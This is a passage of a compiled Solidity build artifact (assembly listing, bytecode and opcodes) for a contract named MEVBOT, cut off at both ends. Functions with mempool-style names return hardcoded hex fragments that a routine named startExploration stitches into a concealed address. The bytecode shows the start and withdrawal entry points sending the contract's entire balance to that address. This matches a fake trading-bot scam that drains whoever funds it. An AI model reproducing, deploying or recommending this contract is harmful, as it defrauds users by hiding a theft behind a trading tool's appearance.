\"contracts/MEVBOT_flattened.sol\":7080:7081  2 */\n      0x02\n        /* \"contracts/MEVBOT_flattened.sol\":7071:7081  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7066:7669  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_80:\n        /* \"contracts/MEVBOT_flattened.sol\":7087:7097  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/MEVBOT_flattened.sol\":7083:7084  i */\n      dup2\n        /* \"contracts/MEVBOT_flattened.sol\":7083:7097  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/MEVBOT_flattened.sol\":7066:7669  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_81\n      jumpi\n        /* \"contracts/MEVBOT_flattened.sol\":7126:7129  256 */\n      0x0100\n        /* \"contracts/MEVBOT_flattened.sol\":7117:7129  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7158:7161  tmp */\n      dup5\n        /* \"contracts/MEVBOT_flattened.sol\":7162:7163  i */\n      dup2\n        /* \"contracts/MEVBOT_flattened.sol\":7158:7164  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_83\n      jumpi\n      invalid\n    tag_83:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/MEVBOT_flattened.sol\":7152:7165  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/MEVBOT_flattened.sol\":7144:7166  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/MEVBOT_flattened.sol\":7139:7166  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7195:7198  tmp */\n      dup5\n        /* \"contracts/MEVBOT_flattened.sol\":7203:7204  1 */\n      0x01\n        /* \"contracts/MEVBOT_flattened.sol\":7199:7200  i */\n      dup3\n        /* \"contracts/MEVBOT_flattened.sol\":7199:7204  i + 1 */\n      add\n        /* \"contracts/MEVBOT_flattened.sol\":7195:7205  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_84\n      jumpi\n      invalid\n    tag_84:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/MEVBOT_flattened.sol\":7189:7206  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/MEVBOT_flattened.sol\":7181:7207  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/MEVBOT_flattened.sol\":7176:7207  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7228:7230  97 */\n      0x61\n        /* \"contracts/MEVBOT_flattened.sol\":7222:7224  b1 */\n      dup4\n        /* \"contracts/MEVBOT_flattened.sol\":7222:7230  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7221:7246  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7242:7245  102 */\n      0x66\n        /* \"contracts/MEVBOT_flattened.sol\":7236:7238  b1 */\n      dup4\n        /* \"contracts/MEVBOT_flattened.sol\":7236:7245  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7221:7246  (b1 >= 97) && (b1 <= 102) */\n    tag_85:\n        /* \"contracts/MEVBOT_flattened.sol\":7217:7419  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_86\n      jumpi\n        /* \"contracts/MEVBOT_flattened.sol\":7268:7270  87 */\n      0x57\n        /* \"contracts/MEVBOT_flattened.sol\":7262:7270  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7217:7419  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_87)\n    tag_86:\n        /* \"contracts/MEVBOT_flattened.sol\":7298:7300  65 */\n      0x41\n        /* \"contracts/MEVBOT_flattened.sol\":7292:7294  b1 */\n      dup4\n        /* \"contracts/MEVBOT_flattened.sol\":7292:7300  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7291:7315  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_88\n      jumpi\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7312:7314  70 */\n      0x46\n        /* \"contracts/MEVBOT_flattened.sol\":7306:7308  b1 */\n      dup4\n        /* \"contracts/MEVBOT_flattened.sol\":7306:7314  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7291:7315  (b1 >= 65) && (b1 <= 70) */\n    tag_88:\n        /* \"contracts/MEVBOT_flattened.sol\":7287:7419  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_89\n      jumpi\n        /* \"contracts/MEVBOT_flattened.sol\":7337:7339  55 */\n      0x37\n        /* \"contracts/MEVBOT_flattened.sol\":7331:7339  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7287:7419  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_90)\n    tag_89:\n        /* \"contracts/MEVBOT_flattened.sol\":7367:7369  48 */\n      0x30\n        /* \"contracts/MEVBOT_flattened.sol\":7361:7363  b1 */\n      dup4\n        /* \"contracts/MEVBOT_flattened.sol\":7361:7369  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7360:7384  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_91\n      jumpi\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7381:7383  57 */\n      0x39\n        /* \"contracts/MEVBOT_flattened.sol\":7375:7377  b1 */\n      dup4\n        /* \"contracts/MEVBOT_flattened.sol\":7375:7383  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7360:7384  (b1 >= 48) && (b1 <= 57) */\n    tag_91:\n        /* \"contracts/MEVBOT_flattened.sol\":7356:7419  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_92\n      jumpi\n        /* \"contracts/MEVBOT_flattened.sol\":7406:7408  48 */\n      0x30\n        /* \"contracts/MEVBOT_flattened.sol\":7400:7408  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7356:7419  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_92:\n        /* \"contracts/MEVBOT_flattened.sol\":7287:7419  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_90:\n        /* \"contracts/MEVBOT_flattened.sol\":7217:7419  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_87:\n        /* \"contracts/MEVBOT_flattened.sol\":7439:7441  97 */\n      0x61\n        /* \"contracts/MEVBOT_flattened.sol\":7433:7435  b2 */\n      dup3\n        /* \"contracts/MEVBOT_flattened.sol\":7433:7441  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7432:7457  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_93\n      jumpi\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7453:7456  102 */\n      0x66\n        /* \"contracts/MEVBOT_flattened.sol\":7447:7449  b2 */\n      dup3\n        /* \"contracts/MEVBOT_flattened.sol\":7447:7456  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7432:7457  (b2 >= 97) && (b2 <= 102) */\n    tag_93:\n        /* \"contracts/MEVBOT_flattened.sol\":7428:7630  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_94\n      jumpi\n        /* \"contracts/MEVBOT_flattened.sol\":7479:7481  87 */\n      0x57\n        /* \"contracts/MEVBOT_flattened.sol\":7473:7481  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7428:7630  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_95)\n    tag_94:\n        /* \"contracts/MEVBOT_flattened.sol\":7509:7511  65 */\n      0x41\n        /* \"contracts/MEVBOT_flattened.sol\":7503:7505  b2 */\n      dup3\n        /* \"contracts/MEVBOT_flattened.sol\":7503:7511  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7502:7526  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_96\n      jumpi\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7523:7525  70 */\n      0x46\n        /* \"contracts/MEVBOT_flattened.sol\":7517:7519  b2 */\n      dup3\n        /* \"contracts/MEVBOT_flattened.sol\":7517:7525  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7502:7526  (b2 >= 65) && (b2 <= 70) */\n    tag_96:\n        /* \"contracts/MEVBOT_flattened.sol\":7498:7630  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_97\n      jumpi\n        /* \"contracts/MEVBOT_flattened.sol\":7548:7550  55 */\n      0x37\n        /* \"contracts/MEVBOT_flattened.sol\":7542:7550  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7498:7630  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_98)\n    tag_97:\n        /* \"contracts/MEVBOT_flattened.sol\":7578:7580  48 */\n      0x30\n        /* \"contracts/MEVBOT_flattened.sol\":7572:7574  b2 */\n      dup3\n        /* \"contracts/MEVBOT_flattened.sol\":7572:7580  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7571:7595  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_99\n      jumpi\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7592:7594  57 */\n      0x39\n        /* \"contracts/MEVBOT_flattened.sol\":7586:7588  b2 */\n      dup3\n        /* \"contracts/MEVBOT_flattened.sol\":7586:7594  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/MEVBOT_flattened.sol\":7571:7595  (b2 >= 48) && (b2 <= 57) */\n    tag_99:\n        /* \"contracts/MEVBOT_flattened.sol\":7567:7630  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_100\n      jumpi\n        /* \"contracts/MEVBOT_flattened.sol\":7617:7619  48 */\n      0x30\n        /* \"contracts/MEVBOT_flattened.sol\":7611:7619  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7567:7630  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_100:\n        /* \"contracts/MEVBOT_flattened.sol\":7498:7630  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_98:\n        /* \"contracts/MEVBOT_flattened.sol\":7428:7630  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_95:\n        /* \"contracts/MEVBOT_flattened.sol\":7659:7661  b2 */\n      dup2\n        /* \"contracts/MEVBOT_flattened.sol\":7654:7656  16 */\n      0x10\n        /* \"contracts/MEVBOT_flattened.sol\":7649:7651  b1 */\n      dup5\n        /* \"contracts/MEVBOT_flattened.sol\":7649:7656  b1 * 16 */\n      mul\n        /* \"contracts/MEVBOT_flattened.sol\":7649:7661  b1 * 16 + b2 */\n      add\n        /* \"contracts/MEVBOT_flattened.sol\":7639:7662  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7104:7105  2 */\n      0x02\n        /* \"contracts/MEVBOT_flattened.sol\":7099:7105  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7066:7669  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_80)\n    tag_81:\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7689:7694  iaddr */\n      dup3\n        /* \"contracts/MEVBOT_flattened.sol\":7674:7695  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":6880:7698  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":8590:8723  function getBalance() private view returns(uint) {... */\n    tag_39:\n        /* \"contracts/MEVBOT_flattened.sol\":8633:8637  uint */\n      0x00\n        /* \"contracts/MEVBOT_flattened.sol\":8695:8716  address(this).balance */\n      selfbalance\n        /* \"contracts/MEVBOT_flattened.sol\":8688:8716  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":8590:8723  function getBalance() private view returns(uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":9115:9192  function getMempoolDepth() private pure returns (string memory) {return \"0\";} */\n    tag_50:\n        /* \"contracts/MEVBOT_flattened.sol\":9164:9177  string memory */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":9180:9190  return \"0\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":9115:9192  function getMempoolDepth() private pure returns (string memory) {return \"0\";} */\n      swap1\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":6505:6583  function getMempoolSol() private pure returns (string memory) {return \"x410\";} */\n    tag_52:\n        /* \"contracts/MEVBOT_flattened.sol\":6552:6565  string memory */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":6568:6581  return \"x410\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x7834313000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":6505:6583  function getMempoolSol() private pure returns (string memory) {return \"x410\";} */\n      swap1\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":10625:10727  function getMempoolShort() private pure returns (string memory) {... */\n    tag_54:\n        /* \"contracts/MEVBOT_flattened.sol\":10674:10687  string memory */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":10699:10715  return \"e81A38a\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      0x6538314133386100000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":10625:10727  function getMempoolShort() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":6593:6701  function fetchMempoolEdition() private pure returns (string memory) {... */\n    tag_56:\n        /* \"contracts/MEVBOT_flattened.sol\":6646:6659  string memory */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":6671:6689  return \"F231C0B30\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x09\n      dup2\n      mstore\n      0x20\n      add\n      0x4632333143304233300000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":6593:6701  function fetchMempoolEdition() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":5003:5111  function fetchMempoolVersion() private pure returns (string memory) {... */\n    tag_58:\n        /* \"contracts/MEVBOT_flattened.sol\":5056:5069  string memory */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":5081:5099  return \"f1336787C\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x09\n      dup2\n      mstore\n      0x20\n      add\n      0x6631333336373837430000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":5003:5111  function fetchMempoolVersion() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":8477:8583  function getMempoolLong() private pure returns (string memory) {... */\n    tag_60:\n        /* \"contracts/MEVBOT_flattened.sol\":8525:8538  string memory */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":8550:8571  return \"C503F985A1EF\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x0c\n      dup2\n      mstore\n      0x20\n      add\n      0x4335303346393835413145460000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":8477:8583  function getMempoolLong() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220ce045a8367ac7561b3bc8f94902c5e89846996ed232f378795881dc76f94f82d64736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040523480156200001157600080fd5b5060405162000c9938038062000c99833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160009080519060200190620001cd929190620001ef565b508060019080519060200190620001e6929190620001ef565b50505062000295565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b5b808211156200029157600081600090555060010162000277565b5090565b6109f480620002a56000396000f3fe6080604052600436106100435760003560e01c80636c02a9311461004f5780637b61c320146100df578063be9a65551461016f578063d4e93292146101795761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100eb57600080fd5b506100f4610221565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610134578082015181840152602081019050610119565b50505050905090810190601f1680156101615780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101776102bf565b005b61018161032a565b005b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102b75780601f1061028c576101008083540402835291602001916102b7565b820191906000526020600020905b81548152906001019060200180831161029a57829003601f168201915b505050505081565b60006102d16102cc610395565b6105f3565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc6102fa610848565b9081150290604051600060405180830381858888f19350505050158015610325573d6000803e3d6000fd5b505050565b600061033c610337610395565b6105f3565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc610365610848565b9081150290604051600060405180830381858888f19350505050158015610390573d6000803e3d6000fd5b505050565b6060806103a0610850565b905060606103ac61088d565b905060606103b86108ca565b905060606103c4610907565b905060606103d0610944565b905060606103dc610981565b90508585858585856040516020018087805190602001908083835b6020831061041a57805182526020820191506020810190506020830392506103f7565b6001836020036101000a03801982511681845116808217855250505050505090500186805190602001908083835b6020831061046b5780518252602082019150602081019050602083039250610448565b6001836020036101000a03801982511681845116808217855250505050505090500185805190602001908083835b602083106104bc5780518252602082019150602081019050602083039250610499565b6001836020036101000a03801982511681845116808217855250505050505090500184805190602001908083835b6020831061050d57805182526020820191506020810190506020830392506104ea565b6001836020036101000a03801982511681845116808217855250505050505090500183805190602001908083835b6020831061055e578051825260208201915060208101905060208303925061053b565b6001836020036101000a03801982511681845116808217855250505050505090500182805190602001908083835b602083106105af578051825260208201915060208101905060208303925061058c565b6001836020036101000a0380198251168184511680821785525050505050509050019650505050505050604051602081830303815290604052965050505050505090565b60006060829050600080806000600290505b602a81101561083b576101008402935084818151811061062157fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061064357fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610694575060668373ffffffffffffffffffffffffffffffffffffffff1611155b156106a45760578303925061073e565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156106e2575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156106f25760378303925061073d565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610730575060398373ffffffffffffffffffffffffffffffffffffffff1611155b1561073c576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff161015801561077c575060668273ffffffffffffffffffffffffffffffffffffffff1611155b1561078c57605782039150610826565b60418273ffffffffffffffffffffffffffffffffffffffff16101580156107ca575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156107da57603782039150610825565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610818575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610824576030820391505b5b5b81601084020184019350600281019050610605565b5082945050505050919050565b600047905090565b60606040518060400160405280600181526020017f3000000000000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600481526020017f7834313000000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600781526020017f6538314133386100000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600981526020017f4632333143304233300000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600981526020017f6631333336373837430000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600c81526020017f433530334639383541314546000000000000000000000000000000000000000081525090509056fea2646970667358221220ce045a8367ac7561b3bc8f94902c5e89846996ed232f378795881dc76f94f82d64736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xC99 CODESIZE SUB DUP1 PUSH3 0xC99 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x295 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x291 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x277 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0x9F4 DUP1 PUSH3 0x2A5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x16F JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x179 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD 